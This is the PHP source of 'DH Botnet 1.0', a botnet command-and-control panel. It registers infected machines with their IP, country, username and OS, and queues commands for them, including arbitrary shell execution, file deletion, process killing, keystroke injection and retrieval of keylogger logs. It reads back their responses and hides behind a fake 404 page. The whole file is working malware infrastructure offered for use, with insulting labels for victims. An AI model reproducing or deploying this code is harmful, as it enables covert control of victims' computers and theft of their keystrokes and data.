<?php
 
// DH Botnet
// Version 1.0
// Coded By Doddy H
 
// Datos
 
$username = "ACA_VA_TU_USER";
$password = "ACA_VA_TU_PASSWORD_EN_MD5";
$host = "ACA_VA_EL_HOST";
$userw = "ACA_VA_EL_USER";
$passw = "ACA_VA_EL_PASS";
$db = "ACA_VA_EL_NOMBRE";
$tiempo_de_carga = "ACA_VA_EL_TIEMPO_DE_CARGA";
 
//
 
// Start the party
 
error_reporting(0);
mysql_connect($host, $userw, $passw);
mysql_select_db($db);
 
//
 
// Registro
if (isset($_POST['entradatrasera'])) {
    $key = mysql_real_escape_string($_POST['key']);
    $ip = mysql_real_escape_string($_POST['ip']);
    $pais = mysql_real_escape_string($_POST['pais']);
    $username = mysql_real_escape_string($_POST['username']);
    $os = mysql_real_escape_string($_POST['os']);
    $timeout = mysql_real_escape_string($_POST['timeout']);
    $control = 0;
    $rea = mysql_query("select clave from slaves");
    while ($ver = mysql_fetch_array($rea)) {
        if ($ver[0] == $key) {
            $control = 1;
        }
    }
    if ($control == 0) {
        mysql_query("INSERT INTO slaves(id,clave,ip,pais,user,os,timeout)values(NULL,'$key','$ip','$pais','$username','$os','$timeout')");
        mysql_query("INSERT INTO ordenes(id,clave)values(NULL,'$key')");
    }
}
//
// Bots siguen vivos
if (isset($_POST['sigovivo'])) {
    $clave = mysql_real_escape_string($_POST['clavenow']);
    mysql_query("UPDATE slaves set estado='1' where clave='$clave'");
}
// Bots mandan rta
if (isset($_POST['mandocarajo'])) {
    $clave = mysql_real_escape_string($_POST['miclave']);
    $rta = mysql_real_escape_string($_POST['mirta']);
    mysql_query("UPDATE ordenes set rta='$rta' where clave='$clave'");
}
//
// Ordenes para bots
if (isset($_POST['ordenespabots'])) {
    $h = mysql_real_escape_string($_POST['clave']);
    $rea = mysql_query("select * from ordenes where clave='$h'");
    $ver = mysql_fetch_array($rea);
    $id = mysql_real_escape_string($ver[0]);
    $clave = mysql_real_escape_string($ver[1]);
    $orden = mysql_real_escape_string($ver[2]);
    $arg1 = mysql_real_escape_string($ver[3]);
    $arg2 = mysql_real_escape_string($ver[4]);
    $arg3 = mysql_real_escape_string($ver[5]);
    $rta = mysql_real_escape_string($ver[6]);
    echo "[+] ID : " . htmlentities($id) . "<br>";
    echo "[+] Clave : " . htmlentities($clave) . "<br>";
    echo "[+] Orden : " . htmlentities($orden) . "<br>";
    echo "[+] Arg1 : " . htmlentities($arg1) . "<br>";
    echo "[+] Arg2 : " . htmlentities($arg2) . "<br>";
    echo "[+] Arg3 : " . htmlentities($arg3) . "<br>";
    echo "[+] Rta : " . htmlentities($rta) . "<br>";
}
//
// Main
elseif (isset($_COOKIE['portal'])) {
    colores();
    $st = base64_decode($_COOKIE['portal']);
    $plit = preg_split("/@/", $st);
    $user = $plit[0];
    $pass = $plit[1];
    if ($user == $username and $pass == $password) {
        echo "<title>DH Botnet 1.0</title>";
        if (isset($_POST['instalar'])) {
            $todo = "
create table slaves (
id int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
clave TEXT NOT NULL,
ip TEXT NOT NULL,
pais TEXT NOT NULL,
user TEXT NOT NULL,
os TEXT NOT NULL,
timeout TEXT NOT NULL,
estado TEXT NOT NULL,
PRIMARY KEY (id)
);
";
            $todo2 = "
create table ordenes (
id int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
clave TEXT NOT NULL,
orden TEXT NOT NULL,
arg1 TEXT NOT NULL,
arg2 TEXT NOT NULL,
arg3 TEXT NOT NULL,
rta TEXT NOT NULL,
PRIMARY KEY (id)
);
";
            if (mysql_query($todo)) {
                if (mysql_query($todo2)) {
                    echo "<script>alert('Installed');</script>";
                }
            } else {
                echo "<script>alert('Error');</script>";
            }
        }
        if (mysql_num_rows(mysql_query("show tables like 'slaves'"))) {
            // TODO EL CODIGO DEL MENU
            if (isset($_POST['about'])) {
                echo "
<center>
 
<h1>[++] Commands :</h1><br><br>
 
<h2>
CMD [command]<br>
GetProcess<br>
KillProcess [pid]<br>
ListDir [directory]<br>
Delete [file]<br>
OpenFile [file]<br>
OpenCD <br>
CloseCD<br>
HideIcons<br>
ShowIcons<br>
HideTaskbar<br>
ShowTaskbar<br>
OpenWord [text]<br>
SendKeys [text]<br>
CrazyMouse [time]<br>
ReadLogsKeylogger<br>
</h2>
<br><br><br>";
                echo '<a href="javascript:history.back()"><h1>Back</h1></a></center>';
                exit(1);
            }
            if (isset($_GET['borrar'])) {
                $id = $_GET['borrar'];
                if (is_numeric($id)) {
                    if (@mysql_query("delete from slaves where id='$id'")) {
                        if (@mysql_query("delete from ordenes where id='$id'")) {
                            echo "<script>alert('Deleted');</script>";
                            echo "<META HTTP-EQUIV='Refresh' CONTENT='0;URL=?'>";
                        }
                    }
                } else {
                    echo "<script>alert('DIE MOTHER FUCKER');</script>";
                }
            }
            if (isset($_GET['console'])) {
                $id = $_GET['console'];
                if (is_numeric($id)) {
                    $re = mysql_query("select * from ordenes where id='$id'");
                    $ver = mysql_fetch_array($re);
                    echo "<center><br><h1>Console</h1><br>";
                    echo "<center><textarea cols=80 rows=40 name=code>";
                    echo htmlentities($ver[6]);
                    echo "</textarea></center><br>";
                    echo '<a href="javascript:history.back()"><h1>Back</h1></a></center>';
                    // ACTUALIZAR A NADA
                    mysql_query("UPDATE ordenes set orden='',arg1='',arg2='',arg3='',rta='' where id=" . $id);
                    exit(1);
                } else {
                    echo "<script>alert('DIE MOTHER FUCKER');</script>";
                }
            }
            if (isset($_POST['mandarcmd'])) { // MUY IMPORTANTE
                $op = mysql_real_escape_string($_POST['options']);
                $id = mysql_real_escape_string($_POST['idiotas']);
                $orden1 = mysql_real_escape_string($_POST['cmd1']);
                $orden2 = mysql_real_escape_string($_POST['cmd2']);
                $orden3 = mysql_real_escape_string($_POST['cmd3']);
                mysql_query("UPDATE ordenes set orden='$op',arg1='$orden1',arg2='$orden2',arg3='$orden3' where id=" . $id);
                $re = mysql_query("select * from slaves where id='$id'");
                $ver = mysql_fetch_array($re);
                $timeout = $ver[6];
                $timeout = $timeout + $tiempo_de_carga;
                $time = $timeout;
                $timeout = $timeout * 1000;
                echo "<script>alert('Wait " . htmlentities($time) . " seconds');</script>";
                echo "
<script type=\"text/javascript\">
setTimeout (\"location.href='?console=$id'\",$timeout);
</script>
";
            } //
            echo "
<br><br>
<center>
<h1>Infected idiots</h1>
<br><br>
";
            $re = mysql_query("select count(clave) from slaves");
            $ver = mysql_fetch_array($re);
            if ($ver[0] == 0) { //
                echo "<script>alert('No idiots');</script>";
            } else {
                $re = mysql_query("select * from slaves");
                echo "
<table border=1  width=1100>
<td ><b>ID</b></td><td ><b>Key</b></td><td ><b>IP</b></td><td ><b>Country</b></td><td ><b>Username</b></td><td ><b>OS</b></td><td ><b>Timeout</b></td><td><b>Status</b></td><td><b>Option</b></td><tr>
";
                $idiotas = array();
                while ($ver = mysql_fetch_array($re)) {
                    if ($ver[7] == 1) {
                        $estado = "Online";
                    } else {
                        $estado = "Offline";
                    }
                    echo "<td >" . htmlentities($ver[0]) . "</td><td >" . htmlentities($ver[1]) . "</td><td >" . htmlentities($ver[2]) . "</td><td >" . htmlentities($ver[3]) . "</td>";
                    echo "<td >" . htmlentities($ver[4]) . "</td><td >" . htmlentities($ver[5]) . "</td><td >" . htmlentities($ver[6]) . "</td><td>" . $estado . "<td><a href=?borrar=" . $ver[0] . ">Delete</a></td><tr>";
                    $idiotas[] = $ver[0];
                    mysql_query("UPDATE slaves set estado='' where id=" . $ver[0]);
                }
                echo "</table>";
            } //
            echo "<form action='' method=POST>";
            echo "
 
<br><br><br><br>
 
<table>
<td>
<b>Idiot :</b>
</td>
<td>
<select name=idiotas>";
            foreach($idiotas as $idiota) {
                echo "<option>" . $idiota . "</option>";
            }
            echo "
</select>
</td><tr>
 
<td><b>Options : </b></td>
<td><select name=options>
<option>CMD</option>
<option>GetProcess</option>
<option>KillProcess</option>
<option>ListDir</option>
<option>Delete</option>
<option>OpenFile</option>
<option>OpenCD</option>
<option>CloseCD</option>
<option>HideIcons</option>
<option>ShowIcons</option>
<option>HideTaskbar</option>
<option>ShowTaskbar</option>
<option>OpenWord</option>
<option>SendKeys</option>
<option>CrazyMouse</option>
<option>ReadLogsKeylogger</option>
</select></td><tr>
 
<td><b>Command 1 : </b></td><td><input type=text name=cmd1></td><tr>
<td><b>Command 2 : </b></td><td><input type=text name=cmd2></td><tr>
<td><b>Command 3 : </b></td><td><input type=text name=cmd3></td>
</table><br>
<input type=submit name=mandarcmd value=Send> <input type=submit name=about value=Help>
";
            echo "</form>";
            echo "<br><br><br><br><br><br><br><h2>-- == (C) Doddy Hackman 2014 || Contact : lepuke[at]hotmail[com] || Web : http://doddyhackman.webcindario.com == --</h2>";
        } else {
            echo "
<center><br><br>
<form action='' method=POST>
<h2>Want to install DH Botnet 1.0 ?</h2><br><br>
<input type=submit name=instalar value=Install>
</form>";
        }
        exit(1);
    }
} elseif (isset($_POST['login'])) {
    if ($_POST['user'] == $username and md5($_POST['passwor']) == $password) {
        setcookie("portal", base64_encode($_POST['user'] . "@" . md5($_POST['passwor'])));
        echo "<script>alert('Welcome idiot');</script>";
        echo '<meta http-equiv="refresh" content=0;URL=>';
    } else {
        echo "<script>alert('DIE MOTHER FUCKER DIE');</script>";
        echo '<meta http-equiv="refresh" content=0;URL=>';
    }
} elseif (isset($_GET['poraca'])) {
    colores();
    echo "
<br><h1><center>Login</center></h1>
<br><br><center>
<form action='' method=POST>
<b>Username : </b><input type=text name=user><br><br>
<b>Password : </b><input type=password name=passwor><br><br>
<input type=submit name=login value=Enter><br>
</form>
</center><br><br>";
} else {
    error();
}
//
// Funciones secundarias
function colores() {
    // Colores
    $color = "#00FF00";
    $fondo = "#000000";
    echo "
 
<STYLE type=text/css>
 
body,a:link {
background-color: $fondo;
color:$color;
Courier New;
cursor:crosshair;
font: normal 0.7em sans-serif,Arial;
}
 
input,textarea,fieldset,select,table,td,tr,option,select {
font: normal 13px Verdana, Arial, Helvetica,
sans-serif;
background-color:$fondo;
color:$color;
border: solid 1px $color;
border-color:$color
}
 
a:link,a:visited,a:active {
color:$color;
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}
 
</style>
 
";
}
function error() {
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>';
    exit(1);
}
// End
mysql_close();
//
 
// The End ?
 
?>
